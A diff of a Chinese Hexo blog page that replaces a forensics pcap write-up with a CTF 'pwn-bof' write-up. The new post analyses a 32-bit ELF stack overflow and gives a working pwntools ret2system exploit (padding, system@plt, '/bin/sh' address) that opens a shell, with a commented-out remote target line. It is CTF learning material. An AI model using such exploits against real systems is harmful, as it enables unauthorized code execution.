@@ -15,21 +15,22 @@
 
 
 
-<meta name="description" content="Forensics2题目描述题目给了一个.pcap文件，给了一句提示：是关于文件的。">
+<meta name="description" content="bof之前做过这道题，但是没做出来，对于pwn类型的题目还不太熟悉，现在对pwn题有了新的认识和知识，再重新解一下这道题目。">
+<meta name="keywords" content="pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Misc：Forensics2（流量分析题）">
-<meta property="og:url" content="https://hanqd.github.io/2019/03/28/Misc Forensics2/index.html">
+<meta property="og:title" content="oj pwn-bof">
+<meta property="og:url" content="https://hanqd.github.io/2019/04/19/oj pwn bof/index.html">
 <meta property="og:site_name" content="HANqd&#39;s BLOG">
-<meta property="og:description" content="Forensics2题目描述题目给了一个.pcap文件，给了一句提示：是关于文件的。">
+<meta property="og:description" content="bof之前做过这道题，但是没做出来，对于pwn类型的题目还不太熟悉，现在对pwn题有了新的认识和知识，再重新解一下这道题目。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/11.PNG">
-<meta property="og:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/12.PNG">
-<meta property="og:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/13.PNG">
-<meta property="og:updated_time" content="2019-03-28T12:38:57.870Z">
+<meta property="og:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/71.PNG">
+<meta property="og:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/72.PNG">
+<meta property="og:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/73.PNG">
+<meta property="og:updated_time" content="2019-04-19T12:50:02.611Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Misc：Forensics2（流量分析题）">
-<meta name="twitter:description" content="Forensics2题目描述题目给了一个.pcap文件，给了一句提示：是关于文件的。">
-<meta name="twitter:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/11.PNG">
+<meta name="twitter:title" content="oj pwn-bof">
+<meta name="twitter:description" content="bof之前做过这道题，但是没做出来，对于pwn类型的题目还不太熟悉，现在对pwn题有了新的认识和知识，再重新解一下这道题目。">
+<meta name="twitter:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/71.PNG">
 
 <link rel="apple-touch-icon" href="/apple-touch-icon.png">
 
@@ -61,7 +62,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>Misc：Forensics2（流量分析题） | HANqd&#39;s BLOG</title>
+<title>oj pwn-bof | HANqd&#39;s BLOG</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -271,11 +272,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我">
 </nav>
-      <div class="body-wrap"><article id="post-Misc Forensics2" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-oj pwn bof" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019/03/28/Misc Forensics2/" class="article-date">
-      <time datetime="2019-03-28T12:37:55.193Z" itemprop="datePublished">2019-03-28</time>
+      <a href="/2019/04/19/oj pwn bof/" class="article-date">
+      <time datetime="2019-04-19T12:48:55.890Z" itemprop="datePublished">2019-04-19</time>
 </a>
 
 
@@ -290,7 +291,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      Misc：Forensics2（流量分析题）
+      oj pwn-bof
     </h1>
   
 
@@ -300,6 +301,10 @@
         
 
         
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+    </div>
+
         <div class="clearfix"></div>
       </div>
       
@@ -307,24 +312,23 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="Forensics2"><a href="#Forensics2" class="headerlink" title="Forensics2"></a>Forensics2</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>题目给了一个.pcap文件，给了一句提示：是关于文件的。<br><a id="more"></a></p>
+        <h2 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h2><p>之前做过这道题，但是没做出来，对于pwn类型的题目还不太熟悉，现在对pwn题有了新的认识和知识，再重新解一下这道题目。<br><a id="more"></a></p>
+<h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>题目给了一个文件，在Ubuntu里的命令行里用file，查看一下文件类型，是ELF类型，32位。</p>
 <h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><ol>
-<li><p>用wireshark软件打开文件，发现有很多协议，之前学的网络的知识也忘得差不多了。。。。决定先了解一下各个协议的功能。</p>
-<ul>
-<li>ICMP：ICMP是（Internet Control Message Protocol）Internet控制报文协议。它是TCP/IP协议簇的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并<strong>不传输用户数据</strong>，但是对于用户数据的传递起着重要的作用。在<strong>网络层</strong>。</li>
-<li>ARP：地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP/IP协议。在<strong>网络层</strong>。</li>
-<li>TCP：TCP（Transmission Control Protocol 传输控制协议）是一种面向连接的、可靠的、基于字节流的传输层通信协议。在因特网协议族（Internet protocol suite）中，TCP层是位于IP层之上，应用层之下的中间层。当应用层向TCP层发送用于网间传输的、用8位字节表示的数据流，TCP则把数据流分割成适当长度的报文段，最大传输段大小（MSS）通常受该计算机连接的网络的数据链路层的最大传送单元（MTU）限制。之后TCP把数据包传给IP层，由它来通过网络将包传送给接收端实体的TCP层。在<strong>运输层</strong>。</li>
-<li>SSH：SSH 为 Secure Shell 的缩写，SSH 为建立在<strong>应用层</strong>基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。通过使用SSH，可以把所有传输的数据进行加密，这样”中间人”这种攻击方式就不可能实现了，而且也能够防止DNS欺骗和IP欺骗。使用SSH，还有一个额外的好处就是传输的数据是经过压缩的，所以可以加快传输的速度。</li>
-<li>NFS：NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。在<strong>应用层</strong></li>
-<li>portmap端口映射是一个服务器，将RPC程序号转换为DARPA的协议端口号，在使用RPC调用时它必须运行。portmap进程的主要功能是把RPC程序号转化为Internet的端口号。</li>
-<li>mount在Windows系统下的含义是：挂载文件到一个虚拟盘或一个虚拟文件夹中，通过访问这个虚拟盘或文件夹使用整个文件。</li>
-</ul>
+<li>用IDA32位打开文件，反汇编到C代码，可见下边代码<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> sub_8048573()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+Ch] [bp-1Ch]@1</span></span><br><span class="line"></span><br><span class="line">  sub_804851B();</span><br><span class="line">  sub_804854A();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"can you pwn me?"</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>根据上述协议的功能和定义，猜测要找的文件在NFS协议共享的资源中，运用了SSH协议进行了加密。</p>
-</li>
-<li>对NFS协议进行过滤，如下图，找到flag.txt.gz，是一个压缩包形式。<br><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/11.PNG" alt></li>
-<li>在这条协议附件逐个分析每条协议传输的信息，最后在write那条中找到了data.<br><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/12.PNG" alt></li>
-<li>在data处右键-》显示分组字节-》选择压缩，即可得到flag。<br><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/13.PNG" alt></li>
+</ol>
+<p>根据read函数和buf可以知道，产生了栈溢出。</p>
+<ol start="2">
+<li>查看保护机制<br><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/71.PNG" alt><br>开启了NX保护。</li>
+<li>计算要覆盖的位数<br>‘a’*0x1c+’a’*4=32</li>
+<li>查看程序中是否有’/bin/sh’<br><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/72.PNG" alt><br>存在。</li>
+<li>查找一下system是否存在，在ida中查找<br><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/73.PNG" alt><br>也存在</li>
+<li>于是部署栈中的内容<br><code>payload = flat([&#39;a&#39;*32,system_plt,&#39;b&#39;*4,binsh_addr])</code><br>代码如下：</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r=remote('pwn1.blue-whale.me',9990)</span></span><br><span class="line">r=process(<span class="string">'./pwn'</span>)</span><br><span class="line">binsh_addr = <span class="number">0x804a02c</span> </span><br><span class="line">system_plt = <span class="number">0x80483f0</span></span><br><span class="line"><span class="comment">#r.recvuntil('can you pwn me?')</span></span><br><span class="line">payload = flat([<span class="string">'a'</span>*<span class="number">32</span>,system_plt,<span class="string">'b'</span>*<span class="number">4</span>,binsh_addr])</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<ol start="6">
+<li>在Ubuntu里输入命令 python pwn1.py,运行下写的代码，id，获得权限，至此已经成功获得shell。ls获得flag。</li>
 </ol>
 
       
@@ -334,13 +338,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2019/03/28/Misc Forensics2/">Misc：Forensics2（流量分析题）</a></p>
+        <p><span>本文标题:</span><a href="/2019/04/19/oj pwn bof/">oj pwn-bof</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">HANqd</a></p>
-        <p><span>发布时间:</span>2019-03-28, 20:37:55</p>
-        <p><span>最后更新:</span>2019-03-28, 20:38:57</p>
+        <p><span>发布时间:</span>2019-04-19, 20:48:55</p>
+        <p><span>最后更新:</span>2019-04-19, 20:50:02</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2019/03/28/Misc Forensics2/" title="Misc：Forensics2（流量分析题）">https://hanqd.github.io/2019/03/28/Misc Forensics2/</a>
-            <span class="copy-path" data-clipboard-text="原文: https://hanqd.github.io/2019/03/28/Misc Forensics2/　　作者: HANqd" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/04/19/oj pwn bof/" title="oj pwn-bof">https://hanqd.github.io/2019/04/19/oj pwn bof/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://hanqd.github.io/2019/04/19/oj pwn bof/　　作者: HANqd" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -352,16 +356,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2019/03/29/每日一题1006/">
-                    每日一题 1006
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2019/03/28/每日一题1005/">
-                    每日一题 1005
+                <a href="/2019/04/17/oj XSS/">
+                    Web babyXSS
                 </a>
             </div>
         
@@ -373,7 +371,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Forensics2"><span class="toc-number">1.</span> <span class="toc-text">Forensics2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目描述"><span class="toc-number">1.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目分析"><span class="toc-number">1.2.</span> <span class="toc-text">题目分析</span></a></li></ol></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#bof"><span class="toc-number">1.</span> <span class="toc-text">bof</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目描述"><span class="toc-number">1.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目分析"><span class="toc-number">1.2.</span> <span class="toc-text">题目分析</span></a></li></ol></li></ol>
         
     </div>
     <style>
@@ -409,7 +407,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"Misc：Forensics2（流量分析题）　| HANqd's BLOG　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"oj pwn-bof　| HANqd's BLOG　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -425,7 +423,7 @@
     
       <div class="duoshuo" id="comments">
     <div id="comment-box"></div>
-    <div class="ds-thread" id="ds-thread" data-thread-key="2019/03/28/Misc Forensics2/" data-title="Misc：Forensics2（流量分析题）" data-url="https://hanqd.github.io/2019/03/28/Misc Forensics2/"></div>
+    <div class="ds-thread" id="ds-thread" data-thread-key="2019/04/19/oj pwn bof/" data-title="oj pwn-bof" data-url="https://hanqd.github.io/2019/04/19/oj pwn bof/"></div>
     <script>
         var duoshuoQuery = {short_name:""};
         var loadComment = function(){
@@ -448,15 +446,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2019/03/29/每日一题1006/" title="上一篇: 每日一题 1006">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2019/03/28/每日一题1005/" title="下一篇: 每日一题 1005">
+            <a href="/2019/04/17/oj XSS/" title="下一篇: Web babyXSS">
                 <i class="fa fa-angle-right"></i>
             </a>
         
